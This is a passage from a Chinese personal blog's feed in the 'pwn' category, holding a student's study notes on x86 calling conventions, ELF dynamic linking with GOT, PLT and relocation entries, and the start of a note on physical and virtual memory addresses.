    <content type="html"><![CDATA[<p>函数参数怎么传递和由谁清除堆栈</p><span id="more"></span><p>炒冷饭，都快要忘记自己有一个博客了 (x</p><h1 id="什么是函数调用约定"><a href="#什么是函数调用约定" class="headerlink" title="什么是函数调用约定"></a>什么是函数调用约定</h1><p>在函数被调用的过程中，编译器都进行了以下的工作：</p><ol><li><p>把调用者的地址压入栈</p></li><li><p>把函数的参数压入栈或者存储到寄存器当中</p></li><li><p>调转到被引用函数</p></li><li><p>把函数使用的寄存器压入栈</p></li><li><p>执行函数</p></li><li><p>处理函数返回值</p></li><li><p>将第三步中压栈的寄存器恢复到原始值</p></li><li><p>清空第一部中的压栈参数和处理返回地址</p></li><li><p>返回到调用者调用时的地址（即步骤一时记录的地址）</p></li></ol><p>函数调用约定，就是对函数调用的一个约束和规定(规范)，描述了函数参数是怎么传递和由谁清除堆栈的。（堆栈平衡？）</p><blockquote><p>x64的前四个参数使用rcx，rdx，r8，r9传递，之后的参数通过栈来传递</p></blockquote><p>它决定以下三个方面：</p><ul><li>函数参数传递的方式（是否采用寄存器传递函数，采用那个寄存器调用函数，参数压栈顺序等）</li><li>函数调用结束后的栈指针由谁恢复（被调用者恢复或是被调用的函数恢复）</li><li>函数修饰名的产生方法</li></ul><p>我们构造一个函数的时候，会规定返回类型和函数名（参数列表），如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">funcA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">funcB</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>; <br></code></pre></td></tr></table></figure><p>除此之外，还有另外一部分，就是函数的调用约定，由系统自动生成，也可以有我们来手动编写规定，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">funA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> __stdcall <span class="hljs-title function_">funcB</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><h4 id="常见的调用约定"><a href="#常见的调用约定" class="headerlink" title="常见的调用约定"></a>常见的调用约定</h4><ul><li>c：__cdecl 、__stdcall、__fastcall、naked、__pascall</li><li>c++：__cdecl 、__stdcall、__fastcall、naked、__pascall、__thiscall</li></ul><h4 id="调用约定的使用"><a href="#调用约定的使用" class="headerlink" title="调用约定的使用"></a>调用约定的使用</h4><p>调用约定书写在函数的前面，相当于函数类型的一部分。要求函数的声明和定义要有相同的调用约定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;   <span class="hljs-comment">//默认是__cdecl</span><br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上在编译过程中就会提示出错，因为声明和定义的调用约定不同。正确应该是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;<br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="不同调用下的规则"><a href="#不同调用下的规则" class="headerlink" title="不同调用下的规则"></a>不同调用下的规则</h1><p>首先我们定义两个概念，即“被调用者”和“调用者”。如下Add()函数就是“被调用者”，ShoowResult()函数就是“调用者”。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a>__cdecl</h2><p>__cdecl是C Declaration的缩写，表示C\C++默认的函数调用约定</p><h4 id="调用方式"><a href="#调用方式" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>从右向左</strong>依次入栈</li><li>由调用者恢复栈顶指针</li><li>编译器在编译时会在函数名前加上一个下划线前缀生成修饰名，格式为_function。如Add()的修饰名是_Add()</li></ul><blockquote><p>注意：调用参数个数可变的函数只能采用这种方式</p></blockquote><h2 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h2><p>__stdcall是Standard Call的缩写，是C++的标准调用方式。</p><h4 id="调用方式-1"><a href="#调用方式-1" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>从右向左</strong>依次入栈</li><li>由被调用者负责恢复栈顶指针</li><li>在输出函数名前加上一个下划线前缀，后面加一个@符号和其参数的字节数，格式为_function@number。如函数Add的修饰名是_Add@8</li></ul><p>__stdcall与__cdecl最主要的区别是第2条规定：由“被调用者”清空实际上就是把对应参数数目的数据从栈中弹出，这样的缺点就是它不能使用于那些不确定数目参数的函数。</p><p>好处在于只需要在函数内部编译出恢复栈顶的代码，而调用者恢复则需要在调用出编译出恢复栈顶的代码。</p><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h2><p>__fastcall是快速调用，因为有部分参数可以通过寄存器直接传递，效率比较高。</p><h4 id="调用方式-2"><a href="#调用方式-2" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>函数的第一个和第二个（<strong>从左向右</strong>）32字节参数（或者尺寸更小的）通过ecx和edx传递（寄存器传递），其他参数通过桟传递。从第三个参数（如果有的话）开始<strong>从右向左</strong>的顺序压栈</li><li>由被调用者恢复栈顶指针</li><li>在函数名前加上@，在函数名后加@和参数字节数，格式为@function@number</li></ul><h2 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall"></a>__thiscall</h2><p>__thiscall是唯一一个不能明确指明的函数修饰，因为thiscall只能用于C++类成员函数的调用，同时thiscall也是C++成员函数缺省的调用约定。由于成员函数调用还有一个this指针，因此必须特殊处理。</p><h4 id="调用方式-3"><a href="#调用方式-3" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>自右向左</strong>入栈</li><li>如果参数的个数确定，this指针通过ecx传递给被调用者；如果参数个数不确定，this指针在所有参数压栈后被压入堆栈</li><li>对于参数个数不确定的由调用者问清理堆栈，否则由被调函数清理。</li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态链接GOT与PLT</title>
    <link href="/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/"/>
    <url>/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/</url>
    
    <content type="html"><![CDATA[<p>主要是动态链接的一些内容</p><span id="more"></span><p>断断续续磨了一个周，本来只是想学一下got表后来发现越挖越深什么都不会，大致了解一下，最后写出了这样一个网络垃圾（x</p><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p><strong>链接就是把目标文件与一些库文件生成可执行文件的一个过程。</strong></p><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><p>要了解“链接”的概念，首先要了解C语言编译生成可执行文件的过程：(1) 预处理；(2) 编译；(3) 汇编；(4) 链接；</p><h5 id="01-预处理"><a href="#01-预处理" class="headerlink" title="01 预处理"></a>01 预处理</h5><p>使用预处理器把源文件<code>test.c</code>经过预处理生成<code>test.i</code>文件，预处理用于将所有的<code>#include</code>头文件以及宏定义替换成其真正的内容，其中<code>test.i</code>是文本文件。</p><p>这里是一个c语言的源文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&#x27;This is a test program!\n&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gcc处理命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -E test.c -o test.i   #-E是让编译器在预处理之后就退出，不进行后续编译过程；-o是指定输出文件名。<br></code></pre></td></tr></table></figure><p>处理后的test.i文件就会变得很长很长，以下是部分截图：</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-09-26.png"></p><h5 id="02-编译"><a href="#02-编译" class="headerlink" title="02 编译"></a>02 编译</h5><p>使用编译器将预处理文件<code>test.i</code>编译成汇编文件<code>test.s</code>，其中<code>test.s</code>是文本文件。</p><p>gcc命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -S test.i -o test.s   #-S让编译器在编译之后停止，不进行后续过程；-o是指定输出文件名<br></code></pre></td></tr></table></figure><p>处理后的test.s文件又变得短短的了</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-19-27.png"></p><h5 id="03-编译"><a href="#03-编译" class="headerlink" title="03 编译"></a>03 编译</h5><p>使用汇编器将汇编文件<code>test.s</code>转换成目标文件<code>test.o</code>，其中<code>test.o</code>是二进制文件。</p><p>汇编过程的命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -c test.s -o test.o   #-c让汇编器把汇编文件test.s转换成目标文件test.o。<br></code></pre></td></tr></table></figure><h5 id="04-链接"><a href="#04-链接" class="headerlink" title="04 链接"></a>04 链接</h5><p>链接过程使用链接器将该目标文件与其他目标文件、库文件、启动文件等链接起来生成可执行文件。</p><p>该步骤的命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc test.o test.exe-E <br></code></pre></td></tr></table></figure><p>拖进IDA就是我们比较熟悉的样子了</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-42-21.png"></p><h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>我们在写程序的时候，通常不会完全靠自己来实现所有功能，我们会调用我们所需要的系统库或者第三方库来实现我们的功能，这些库就是动态链接库。</p><blockquote><p>动态链接库可以映射到不同进程的不同虚拟地址，所以属于“地址无关代码”。</p></blockquote><p>🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];<br>    <span class="hljs-built_in">strncpy</span>(buf, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">32</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这段代码中我们调用了系统库，在编译完成后可以查看文件的symbol。会发现在printf和strncpy前面都是没有定义的，这就是用于支持动态连接功能的。</p><blockquote><p>两种命令可以随意挑选，但结果不太一样，还没搞明白😳</p><p><code>nm -g [filename]</code></p><p><code>readelf  -s [filename]</code></p></blockquote><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_18-30-06.png"></p><p>通过objdump命令查看相关函数的反汇编模块 <code>objdump -D [filename]</code>（在.plt部分）</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_21-05-57.png"></p><p>可以看到，程序首先进行jupq操作跳转到相应的代码段，这个代码段就是用于给“地址无关代码”做动态地址重定位，链接器将这个函数的调用代码跳转到程序运行时的动态装载地址。</p><h3 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h3><p>链接器（Linker）是一个程序，将一个或多个由编译器或汇编器生成的目标文件外加库链接为一个可执行文件。目标文件是包括机器码和链接器可用信息的程序模块。</p><p>简单的讲，<strong>链接器的工作就是解析未定义的符号引用，将目标文件中的占位符替换为符号的地址</strong>。</p><p>链接器还要完成程序中各目标文件的地址空间的组织，涉及重定位工作。</p><h5 id="链接器的工作步骤"><a href="#链接器的工作步骤" class="headerlink" title="链接器的工作步骤"></a>链接器的工作步骤</h5><ul><li>将代码和数据模块象征性地放入内存</li><li>决定数据和指令标签的地址</li><li>修补内部和外部引用</li></ul><h5 id="链接器需要对动态链接库做的情"><a href="#链接器需要对动态链接库做的情" class="headerlink" title="链接器需要对动态链接库做的情"></a>链接器需要对动态链接库做的情</h5><ul><li>链接库在将目标文件链接成可执行文件的的时候，如果发现某一个变量或者函数在目标中找不到，就会按照 gcc 预定义的动态库寻找动态库中定义的变量或者函数</li><li>如果链接库在某一动态库中找到了该变量或者函数的定义，链接库首先会把这个动态链接库写到可执行文件的依赖库中，然后生成这个当前变量或者函数的代理symbol</li><li>在偏移表中生成真正的动态跳转指令，并且在库函数代理symbol中跳转到相应的偏移位置</li></ul><h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>重定位（Relocations）就是把程序的逻辑地址变换成为内存中的实际地址空间的过程。</p><p>重定位分为两步：</p><ul><li>重定位节和符号引用</li></ul><p>在这一步中，连接器将所有相同类型的节合并为同一类型的新聚节。随后链接器把运行时的内存赋值给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块的每个符号。</p><blockquote><p>e.g.所有输入模块的.data节被合并为一个节，这个节成为输入的可执行目标文件的.data节。</p></blockquote><p>当这一步完成，程序中的每条指令和全局变量都有唯一的运行时的内存地址了。</p><ul><li>重定位节中的符号引用</li></ul><p>在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得他们指向正确的运行地址。</p><p>其中，链接器执行这一步需要依靠可重定位目标模块中成为<strong>重定位条目</strong>的数据结构。</p><h5 id="重定位条目"><a href="#重定位条目" class="headerlink" title="重定位条目"></a>重定位条目</h5><p>当汇编器生成一个目标模块时，他并不知道数据和代码最终会被放在内存的那个位置，也不知道这个模块引用的外部定义的函数或者全局变量的位置。所以，当汇编器遇到一个对最终位置未知的目标引用，它就会生成一个重定位条目，告诉连接器将目标文件合并成可执行文件时如何修改这个引用。</p><p>代码的重定位条目放在<code>.rel.text</code>中，已经初始化数据的重定位条目放在<code>.rel.data</code>中。</p><p>重定位条目分为两种格式：<code>Rel</code>和<code>Rela</code>。每个重定位条目表示一个必须被重定位的符号引用，并指明如何计算被修改的符号引用。</p><blockquote><p>重定位条目<code>Rel</code>和<code>Rela</code>之间的唯一区别：<code>Rel</code>中没有<code>Addend</code>字段。</p></blockquote><p>查看文件中的重定位信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">readelf -r [filename]<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-12_21-32-29.png"></p><ul><li><p><code>Offset</code>是 Relocation Entry 结构体中的第 1 个字段，占用 8 字节，表示<strong>需要修改的符号引用的位置</strong>。</p><ul><li><p>对于可重定位目标文件，该字段表示需要修改的符号引用的起始位置在目标 section （<code>.rela.text</code>中的重定位条目对应的目标 section 为<code>.text</code>，<code>.rela.data</code>中的重定位条目对应的目标 section 为<code>.data</code>，以此类推）中的偏移量（字节）。</p></li><li><p>对于可执行目标文件和可共享目标文件，该字段表示需要修改的符号引用的起始位置所对应的虚拟内存地址。</p></li></ul></li><li><p><code>Info</code>是 Relocation Entry 结构体中的第 2 个字段，占用 8 字节，表示<strong>符号表索引和重定位类型</strong>（符号表索引占用高 32 位，重定位类型占用低 32 位）。</p><ul><li><p>符号表索引表示需要修改的符号引用在<code>.symtab</code>section中的索引。这里的<code>Sym. Value</code>和<code>Sym. Name</code>列只是打印了所对应符号表条目中<code>Value</code>和<code>Name</code>列的值。</p></li><li><p>重定位类型指示链接器如何修改该符号引用的值。重定位类型因不同的处理器而异。</p></li></ul></li><li><p><code>Addend</code>是 Relocation Entry 结构体中的第 3 个字段，占用 8 字节，表示一个有符号常数，一些重定位类型要使用它对被修改符号引用的值做<strong>偏移调整</strong>。</p></li></ul><h1 id="静态链接和动态链接"><a href="#静态链接和动态链接" class="headerlink" title="静态链接和动态链接"></a>静态链接和动态链接</h1><h4 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h4><blockquote><p>静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成链接到一块生成可执行程序。这里的库指的是静态链接库，Windows下以<code>.lib</code>为后缀，Linux下以<code>.a</code>为后缀。</p></blockquote><p>若程序使用静态链接方式，则程序所有代码都将集成到同一个二进制文件中，其优点在于无依赖关系，可以在不同运行环境的OS下运行。</p><p>但是缺点也十分明显，由于二进制文件中包含全部代码，所以所占空间较大；如果多次运行同一个程序，则OS可能会对某个库函数进行多次重复 的加载，占用了不必要的内存；若某个公用的库函数产生了更新，则需要重新编译所有使用了该库的程序，工作量较大。</p><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ul><li>代码装载速度快，执行速度略比动态链接库快；</li><li>只需保证在开发者的计算机中有正确的.lib文件，在以二进制形式发布程序时不需考虑在用户的计算机上.lib文件是否存在及版本问题。</li></ul><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul><li>使用静态链接生成的可执行文件体积较大，包含一些重复相同的代码，造成内存空间的浪费。</li></ul><h4 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h4><p>动态链接（Dynamic Linking），把链接这个过程推迟到了运行时再进行，在可执行文件装载时或运行时，由操作系统的装载程序加载库。这里的库指的是动态链接库，Windows下以<code>.dll</code>为后缀，Linux下以<code>.so</code>为后缀。</p><p>在Windows下的动态链接也可以用到.lib为后缀的文件，但这里的<code>.lib</code>文件叫做导入库，是由<code>.dll</code>文件生成的。</p><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><ul><li><p>生成的可执行文件较小；</p></li><li><p>适用于大规模的软件开发，使开发过程相对独立，耦合度减小，便于不同的开发者和开发组织之间进行开发和测试；</p></li><li><p>不同编程语言编写的程序只要按照函数调用约定就可以调用同一个DLL函数；</p></li><li><p>DLL文件与EXE文件独立，只要输出接口不变（即名称、参数、返回值类型和调用约定不变），更换DLL文件不会对EXE文件造成任何影响，因而极大地提高了可维护性和可扩展性</p></li></ul><h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><ul><li>使用动态链接库的应用程序不是自完备的，它依赖的DLL模块也要存在，如果使用载入时动态链接，程序启动时发现DLL不存在，系统将终止程序并给出错误信息；</li><li>速度比静态链接慢</li></ul><h1 id="GOT与PLT"><a href="#GOT与PLT" class="headerlink" title="GOT与PLT"></a>GOT与PLT</h1><p>为了支持动态链接这一工作过程，在<code>.elf</code>文件中有四个section与之相关：</p><ul><li><code>.got</code> ：全局偏移表（Global Offset Table），用于存储外部符号的绝对地址即运行时符号的真实地址，由链接器进行填充，包含动态链接的函数的地址。</li><li><code>.plt</code>：过程链接表（Procedure Linkage Table），就是一小段跳转指令，存有从<code>.got.plt</code>中查找外部函数地址的代码，若是第一次调用该函数，则会触发链接器解析函数地址并填充在<code>.got.plt</code>相应的位置；若函数地址已经存储在<code>.got.plt</code>中则直接跳转到对应地址继续执行。</li><li><code>.got.plt</code>：是plt的got。它包含返回.plt去触发查找的地址，或者是一个经过查找后填充的正确符号地址。</li><li><code>.plt.got</code>：不知道干啥用的……</li></ul><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>因为静态链接中的重定位工作全部在运行时完成，且当我们引用了某一个库，程序将会对其中的所有函数和全局变量进行重定位，这种情况下，链接的动态库越大链接的时间就越长，系统的启动时间就越长。</p><p>为了解决这一问题，延迟绑定的概念被提出。延迟绑定规定只有符号真正被引用时才会进行重定位，而不是在刚开始就对所有的动态符号进行重定位。</p><p>延迟绑定由plt来实现，在elf文件中，plt表和got表几乎时时刻刻伴随着<del>（这是可以嗑的吗是可以的吗）</del>。</p><p>在got表中，前三项内容不对应符号的引用，分别对应：</p><ul><li>got[0]：当前的elf文件中.synamic段的地址</li><li>got[1]：保留</li><li>got[2]：动态链接器的符号解析函数</li></ul><p>其余的项被用作符号重定位，对于外部函数(即外部跳转)的 got 表项而言，在编译阶段保存的是 .plt 表的起始位置，对于数据引用的 plt 表项而言，编译阶段的值为 0。</p><p>plt 的作用是为每一次模块外部的函数调用设置一小段跳转代码。在 arm 编译器的实现中，对于每一项外部跳转，对应 plt 中三条指令。和 got 类似，plt 的前面部分也被系统”征用”了，这部分负责调用动态链接器中的符号解析函数完成动态解析工作，后续的部分才是对应具体外部跳转的指令。</p><p>在程序的编译阶段，plt 跳转指令表项和 got 表项就实现了绑定，其映射关系为：plt 第一段跳转指令对应 got 第四个表项，plt 第二段跳转指令对应 got 第五个表项，以此类推。</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-33-10.png"></p><p>🌰：<br>对于一个c语言文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world1!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world2!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对其进行编译后查看其main函数的反汇编结果</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_16-58-54.png"></p><blockquote><p>%rip是一个指针，此处相当于寄存器相对寻址</p></blockquote><p>在<code>0x40054d</code>调用了<code>0x400430&lt;puts@plt&gt;</code>，当程序rip到400340时，需要执行的操作对应的汇编代码为：</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-00-02.png"></p><hr><p>陆陆续续把基础的小零碎学完啦！🥳</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理地址，虚拟地址和逻辑地址</title>
    <link href="/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/"/>
    <url>/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>关于物理地址，虚拟地址和逻辑地址的定义和之间的关系</p><span id="more"></span><p>虽然写了这么多知识点但脑袋还是乱乱的，希望哪天突然开窍叭🥱</p><h3 id="理解内存"><a href="#理解内存" class="headerlink" title="理解内存"></a>理解内存</h3><p>我们平时使用的各种数据都是存储在硬盘等存储器上，但硬盘的运行速度很慢。所以需要运行程序或者使用数据时，这些数据必须从硬盘上转到另一种容量小但速度快很多的存储器，之后才送进CPU进行处理。这中间的存储器就是内存。</p><p>无论何种存储器，软盘、硬盘、光盘或者内存，都有地址。</p><p>其中：</p><ul><li>我们程序所使用的内存地址叫做<strong>虚拟内存地址</strong>（<em>Virtual Memory Address</em>）</li><li>实际存在硬件里面的空间地址叫<strong>物理内存地址</strong>（<em>Physical Memory Address</em>）。</li></ul><h1 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h1><p><strong>物理地址就是常说的内存地址，是内存当中存储数据的一个标识，并不是数据本身，通过内存地址可以找到内存当中存储的数据。</strong></p><p>计算机将内存划分为一个个小的内存单元，同时对其编号，这样就能有效管理内存。在空间划分实践中，一个<strong>内存单元</strong>的大小为1<strong>字节</strong>。一个字节是八个比特，相当于八个二进制位，两个十六进制位。</p><blockquote><p>可以理解为一栋叫内存的楼，每一套商品房都有自己的门牌号叫内存单元，每一个家庭是一个数据，每一位家庭成员所居住的小房间则不会进行编号。</p></blockquote><p>每个内存单元都有编号（内存编号），内存编号可以称为<strong>地址</strong>，在<code>C</code>语言中也称为<strong>指针</strong>。</p><h5 id="🌰"><a href="#🌰" class="headerlink" title="🌰"></a>🌰</h5><p>在内存中存储”修饰符“或”MOD“，可以示意为：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-28_20-14-36.png"></p><p>![]&#x2F;img&#x2F;物理地址，虚拟地址和逻辑地址&#x2F;Snipaste_2023-03-28_20-23-49.png)</p><blockquote><p>数字后面加H表示十六进制</p></blockquote><p>在第一行中，每一格表示一段内存，而格子里的内容是这段内容记下的数据；第二行中每一格内数字就是对应的内存的地址。</p><p>汉字在一个地址空间里储存不下，会放进两个连续的地址空间里。而字母或者阿拉伯数字就可以放进一个内存地址里。在上图中，”修“的内存地址为1000H，或者M的内存地址为”1000H”。</p><h1 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h1><p>虚拟存储器不是任何实际的物理存储器，而是借助磁盘等辅助存储器来扩大主存容量，使之为更大或更多的程序所使用。</p><p><strong>虚拟地址用于指示虚拟存储器的地址，它是用逻辑地址指示的</strong></p><p>在程序运行时，我们需要将进程与物理地址映射起来，才能区分这些内存中存储的数据属于哪个进程。但内存大小有限，进程却可以很多，甚至可能同时进行多个进程。为了实现让很多进程共用一个存储资源有限的内存，我们引出虚拟地址的概念，我们先将进程与虚拟地址映射起来，再将虚拟地址与物理地址映射起来。</p><p>操作系统引入了虚拟内存，进程持有的虚拟地址会通过 CPU 